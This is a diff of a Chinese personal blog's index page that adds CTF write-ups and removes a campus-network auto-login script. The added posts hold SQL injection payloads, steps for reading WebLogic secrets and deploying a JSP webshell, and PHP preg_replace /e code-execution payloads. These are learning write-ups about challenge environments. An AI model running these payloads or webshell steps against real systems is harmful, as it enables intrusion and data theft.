@@ -143,7 +143,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">55</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">58</span></a></li>
         <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
         <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
       <li class="menu-item menu-item-search">
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">58</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -273,6 +273,397 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/bfdb9200/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/bfdb9200/" class="post-title-link" itemprop="url">国庆赛部分赛题复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-10-13 19:05:32 / 修改时间：21:59:32" itemprop="dateCreated datePublished" datetime="2021-10-13T19:05:32+08:00">2021-10-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">ctf学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/bfdb9200/" class="post-meta-item leancloud_visitors" data-flag-title="国庆赛部分赛题复现" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/bfdb9200/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/bfdb9200/" class="cy_cmt_count" data-xid="posts/bfdb9200/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>868</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a target="_blank" rel="noopener" href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a target="_blank" rel="noopener" href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/31200392/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/31200392/" class="post-title-link" itemprop="url">2021秋季赛部分wp</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-10-11 23:41:41 / 修改时间：23:56:40" itemprop="dateCreated datePublished" datetime="2021-10-11T23:41:41+08:00">2021-10-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">ctf学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/31200392/" class="post-meta-item leancloud_visitors" data-flag-title="2021秋季赛部分wp" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/31200392/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/31200392/" class="cy_cmt_count" data-xid="posts/31200392/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>21 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。</p>
+<p>校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/31200392/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/c1b9d3fa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/c1b9d3fa/" class="post-title-link" itemprop="url">20210928</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-09-29 00:15:39 / 修改时间：01:38:22" itemprop="dateCreated datePublished" datetime="2021-09-29T00:15:39+08:00">2021-09-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/c1b9d3fa/" class="post-meta-item leancloud_visitors" data-flag-title="20210928" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/c1b9d3fa/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/c1b9d3fa/" class="cy_cmt_count" data-xid="posts/c1b9d3fa/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
+<p>代码审计 文件包含</p>
+</blockquote>
+<p>先利用data数据流，或者php://input绕过第一个，再利用php://filter读取next.php源码</p>
+<p>这个有个坑，老忘，include php文件时，要用</p>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=next.php
+</code></pre>
+<p>尽心base64编码，否则传不过来。</p>
+<p>代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们先看一下preg_replace用法</p>
+<pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed
+</code></pre>
+<p>搜索subject中匹配pattern的部分，以replacement进行替换。 </p>
+<p>这里又看了看php语法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> 循环用于遍历数组。</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每进行一次循环，当前数组元素的值就会被赋值给 <span class="variable">$value</span> 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每一次循环，当前数组元素的键与值就都会被赋值给 <span class="variable">$key</span> 和 <span class="variable">$value</span> 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  为 <span class="number">1</span>，对应的 value 为 Google</span><br><span class="line">key  为 <span class="number">2</span>，对应的 value 为 Runoob</span><br><span class="line">key  为 <span class="number">3</span>，对应的 value 为 Taobao</span><br></pre></td></tr></table></figure>
+
+<p>就差不多了，直接构造payload</p>
+<pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
+</code></pre>
+<p>这里还利用了preg_replace /e 模式下的代码执行问题，\S*会匹配到getFlag这个函数</p>
+<pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);
+</code></pre>
+<p>preg_replace 函数在匹配到符号正则的字符串时，会将第二个参数当做代码来执行，即 ‘strtolower(“\1”)’ </p>
+<p>这里的\1就相当于是第一个匹配项，由于\S<em>由</em>（）<em>包裹这里有个<strong>反向引用</strong>，\S</em>匹配的第一个表达式就是${getFlag()}，对其进行代码执行，进而利用这个函数的eval</p>
+<p>还可以直接利用这个漏洞命令执行而不用eval</p>
+<pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;
+</code></pre>
+<p>拼接的</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1212,393 +1603,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/cfeeb04a/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/cfeeb04a/" class="post-title-link" itemprop="url">python实现校园网自动登录</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-09-22 12:02:25 / 修改时间：12:52:34" itemprop="dateCreated datePublished" datetime="2021-09-22T12:02:25+08:00">2021-09-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/python%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index"><span itemprop="name">python实践</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/cfeeb04a/" class="post-meta-item leancloud_visitors" data-flag-title="python实现校园网自动登录" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/cfeeb04a/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/cfeeb04a/" class="cy_cmt_count" data-xid="posts/cfeeb04a/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.4k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p>
-<p>而且竟然能用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p>
-<p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后打包，设置开机自启动就行</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/6f73e94e/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/6f73e94e/" class="post-title-link" itemprop="url">中国矿业大学正方教务爬虫</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
